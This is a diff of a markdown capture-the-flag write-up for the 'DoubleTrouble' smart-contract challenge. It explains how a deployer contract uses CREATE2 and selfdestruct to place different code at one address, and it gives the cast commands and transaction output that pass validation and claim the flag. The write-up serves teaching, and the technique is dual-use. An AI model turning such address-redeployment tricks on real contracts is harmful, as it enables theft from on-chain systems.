@@ -45,11 +45,16 @@ contract DoubleTrouble {
 
 ```
 
+<br>
+<br>
 
 ### Solve
 
 In that one we had to deploy a smart contract that will deploy 2 kind of smart contracts
 but in a way that the public addresses of both contracts will be the same, thus we can trigger properly the mechanisms (the 2 functions of `Doubletrouble`) and get the final flag
+
+<br>
+<br>
 
 ### DoubleDeploy.sol
 ```solidity
@@ -97,15 +102,22 @@ contract Deployer {
 
 ```
 note that when deploying smart contracts, the "constructor's" memory that is returned will be the smart contract runtime code, that what 
+
+<br>
+
 ```solidity
 assembly {
 	return(add(b, 0x20), mload(b))
 }
 ```
 allow us to do
+  
 see https://www.rareskills.io/post/ethereum-contract-creation-code for more indepth understanding of contructor.
 
 also see https://mixbytes.io/blog/pitfalls-of-using-cteate-cteate2-and-extcodesize-opcodes for `create2` opcode.
+
+<br>
+<br>
 
 ## The full steps
 
@@ -119,12 +131,14 @@ Transaction hash: 0x009d9bcd9efdb3cec30ab57a4563e83599f3c74339f073f9cf658fcddaee
 ```
 Deploying the "deployer" contract, the one that will allow me to do the trick
 
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ DOUBLE=0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333
 ```
 Here I store my "deployer" smart contract's public address in env variable `DOUBLE` 
 
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast block-number --rpc-url $RPC 
@@ -132,6 +146,7 @@ Here I store my "deployer" smart contract's public address in env variable `DOUB
 ```
 Here we make sure that the next block will be an even number so we can deploy our first tiny smart contract
 
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast send $DOUBLE --rpc-url $RPC --private-key $PK "deployFinal()"
@@ -158,14 +173,14 @@ to                      0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333
 ```
 Here since the next block will be even I am going to deploy that contract => `0x33ff`
 
-
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ FLAG=0xe13b1ce0a7e9f44e8e9d768e9215ba5a7a0e08e8
 ```
 here `FLAG` is the fancy name I gave to the first deployed smart contract's public address, the one that will be used to "validate" in the challenge contract
 
-
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast send $CHALL --rpc-url $RPC --private-key $PK "validate(address)" $FLAG
@@ -191,6 +206,7 @@ to                      0xd0734E662a6a01f1c62FF0253ba4F2DA90783468
 ```
 I am passing the first step, which is validating the public address of `FLAG`
 
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast send $FLAG --rpc-url $RPC --private-key $PK                     
@@ -217,6 +233,7 @@ to                      0xe13b1CE0a7e9f44E8e9d768e9215Ba5a7a0E08E8
 ```
 Here I just send a empty transaction so it will trigger the 2 opcodes of `FLAG` conrtact which is `selfdestruct` letting me able to deploy another contract using the same public address
 
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast block-number --rpc-url $RPC            
@@ -224,7 +241,7 @@ Here I just send a empty transaction so it will trigger the 2 opcodes of `FLAG` 
 ```
 And then I again check the current block, meaning the next one will be odd and thus will deploy the winning smart contract
 
-
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast send $DOUBLE --rpc-url $RPC --private-key $PK "deployFinal()"         
@@ -251,7 +268,7 @@ to                      0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333
 
 ```
 
-
+<br>
 
 ```bash
 (venv) ➜  DoubleTrouble git:(main) ✗ cast send $CHALL --rpc-url $RPC --private-key $PK "flag(address)" $FLAG
@@ -276,4 +293,7 @@ authorizationList
 to                      0xd0734E662a6a01f1c62FF0253ba4F2DA90783468
 
 ```
+
+<br>
+
 Flagged !
